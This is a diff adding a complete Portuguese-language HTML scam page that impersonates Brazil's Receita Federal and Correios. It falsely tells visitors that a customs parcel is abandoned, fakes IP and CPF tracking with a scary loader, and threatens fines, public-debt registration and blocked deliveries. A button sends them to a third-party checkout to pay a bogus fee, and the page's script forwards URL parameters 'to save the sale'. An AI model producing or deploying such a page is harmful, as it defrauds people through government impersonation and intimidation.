@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema Aduaneiro | Alerta de Evasão</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --vermelho-sangue: #b71c1c;
+            --preto-absoluto: #111;
+            --cinza-fundo: #f8f9fa;
+            --verde-regularizar: #2e7d32;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { background-color: var(--cinza-fundo); color: #333; overflow-x: hidden; }
+
+        /* --- LOADER DE "RASTREAMENTO" --- */
+        #evasao-loader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 99999;
+        }
+        .warning-spin {
+            width: 60px; height: 60px; border: 5px solid transparent;
+            border-top: 5px solid var(--vermelho-sangue); border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .sys-text { color: #ff5252; font-family: monospace; font-size: 16px; text-align: center; }
+
+        /* --- HEADER DO ALERTA --- */
+        .top-alert {
+            background: var(--vermelho-sangue); color: #fff; text-align: center;
+            padding: 15px; font-weight: 900; font-size: 14px; letter-spacing: 2px;
+            text-transform: uppercase; animation: flash 1s infinite;
+        }
+        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        .logos-container {
+            display: flex; justify-content: center; align-items: center; gap: 30px;
+            padding: 20px; background: #fff; border-bottom: 2px solid #ddd;
+        }
+        .logos-container img { height: 40px; filter: grayscale(100%); opacity: 0.8; }
+
+        /* --- CAIXA DE NOTIFICAÇÃO --- */
+        .container { max-width: 600px; margin: 30px auto; padding: 0 20px; display: none; }
+        
+        .box-ameaca {
+            background: #fff; border: 3px solid var(--vermelho-sangue);
+            padding: 30px; box-shadow: 0 10px 30px rgba(183, 28, 28, 0.2);
+            position: relative;
+        }
+
+        .icone-gigante { font-size: 60px; text-align: center; margin-bottom: 15px; }
+        
+        h1 { color: var(--preto-absoluto); font-size: 24px; font-weight: 900; text-align: center; text-transform: uppercase; margin-bottom: 20px; line-height: 1.2; }
+        
+        .texto-juridico { font-size: 14px; color: #444; text-align: justify; margin-bottom: 20px; line-height: 1.6; border-left: 4px solid var(--preto-absoluto); padding-left: 15px; background: #f1f1f1; padding: 15px; }
+        
+        .lista-penas { list-style: none; margin-bottom: 30px; }
+        .lista-penas li { font-size: 14px; font-weight: 700; color: var(--vermelho-sangue); margin-bottom: 10px; padding-left: 25px; position: relative; }
+        .lista-penas li::before { content: "✖"; position: absolute; left: 0; color: var(--vermelho-sangue); }
+
+        /* --- BOTÕES --- */
+        .btn-salvar {
+            display: block; background: var(--verde-regularizar); color: #fff;
+            text-align: center; padding: 22px; font-size: 18px; font-weight: 900;
+            text-decoration: none; text-transform: uppercase; box-shadow: 0 6px 0 #1b5e20;
+            transition: 0.2s; cursor: pointer; border: none; width: 100%; border-radius: 4px;
+        }
+        .btn-salvar:active { transform: translateY(6px); box-shadow: none; }
+        
+        .btn-assumir-risco {
+            display: block; text-align: center; margin-top: 20px; color: #999;
+            font-size: 11px; text-decoration: underline; cursor: pointer; text-transform: uppercase;
+        }
+
+        .footer-legal { text-align: center; font-size: 10px; color: #999; margin-top: 30px; }
+    </style>
+</head>
+<body>
+
+    <div id="evasao-loader">
+        <div class="warning-spin"></div>
+        <div class="sys-text" id="sys-msg">
+            [!] TENTATIVA DE SAÍDA IDENTIFICADA<br><br>
+            Registrando IP e vinculando ao CPF associado...
+        </div>
+    </div>
+
+    <div class="top-alert">
+        Bloqueio Cautelar Ativado
+    </div>
+
+    <div class="logos-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Logo_Receita_Federal_do_Brasil.svg" alt="Receita Federal">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtWEmBo2QRwx2O0_coWmsjpJi_eAUWkutl4w&s" alt="Correios">
+    </div>
+
+    <div class="container" id="main-content">
+        <div class="box-ameaca">
+            <div class="icone-gigante">⚖️</div>
+            <h1>Notificação Extrajudicial de Abandono de Carga</h1>
+            
+            <div class="texto-juridico">
+                O sistema logístico detectou a suspensão do processo de pagamento da <strong>Guia de Despacho Postal (GDP)</strong> obrigatória. O abandono do objeto retido na alfândega ou em rota não isenta o titular do CPF das responsabilidades fiscais.
+            </div>
+
+            <p style="font-size: 14px; font-weight: 700; margin-bottom: 15px; color: #111;">
+                O fechamento desta página sem a devida regularização resultará em:
+            </p>
+
+            <ul class="lista-penas">
+                <li>Multa de R$ 349,90 por abandono de mercadoria importada;</li>
+                <li>Inscrição automática do CPF na Dívida Ativa da União;</li>
+                <li>Bloqueio permanente de entregas vinculadas a este endereço.</li>
+            </ul>
+
+            <a href="https://app.penguimpay.com/checkout/c1207f6b-88d3-44ae-bd1d-ab92c57b7732" class="btn-salvar" id="link-checkout">
+                REGULARIZAR TAXA AGORA E CANCELAR MULTA
+            </a>
+
+            <div class="btn-assumir-risco" onclick="alert('Declaração de abandono registrada. As multas serão processadas e enviadas ao endereço de correspondência.')">
+                Estou ciente. Desejo abandonar a carga e assumir as multas.
+            </div>
+        </div>
+
+        <div class="footer-legal">
+            Ministério da Fazenda - Secretaria da Receita Federal do Brasil.<br>
+            Art. 689 do Regulamento Aduaneiro (Decreto nº 6.759/2009).
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            // Efeito de "Hacking/Registro"
+            const sysMsg = document.getElementById('sys-msg');
+            
+            setTimeout(() => {
+                sysMsg.innerHTML = "[!] ACESSO BLOQUEADO<br><br>Gerando protocolo de infração aduaneira...";
+            }, 1500);
+
+            setTimeout(() => {
+                document.getElementById('evasao-loader').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+            }, 3500);
+
+            // Repasse de Parâmetros de URL para salvar a venda
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.toString()) {
+                const linkCheckout = document.getElementById('link-checkout');
+                linkCheckout.href += (linkCheckout.href.includes('?') ? '&' : '?') + urlParams.toString();
+            }
+        };
+    </script>
+</body>
+</html>
